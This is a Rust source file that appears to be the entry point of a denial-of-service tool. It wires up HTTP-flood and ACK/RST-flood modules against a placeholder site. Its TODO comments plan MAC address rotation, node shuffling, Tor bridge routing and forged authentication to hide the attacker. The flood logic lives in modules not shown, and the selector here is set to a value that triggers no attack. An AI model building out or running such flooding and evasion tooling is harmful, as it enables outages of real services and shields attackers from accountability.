use std::error::Error;

mod http_flood;
mod ack_rst_flood;
mod utils;

#[tokio::main]
async fn main() ->  Result<(),  Box<dyn Error>>{
    // @todo mac address changer(interval 600s) 
    
    
    // @todo2 Shuffle network Node(If you have some nodes)


    // @todo3 or conn Tor Bridge(default)


    // @todo4 miss-authentication application layer(if you need) 

    
    utils::show_logo();

    let site= ".example.com";
    let url: String= format!("https://www.{site}");
    let times= 2;
    let http_flood= http_flood::HttpFlood::new(url, times);

    let input_number=0_u16;

    match input_number {
        1 => http_flood.get_resource_attack().await,
        // 2 => http_flood.post_requeste_attack("body".to_string(), utils::get_text_data()).await,
        _ => println!("Unvalid code"),
    }
     
    Ok(())
}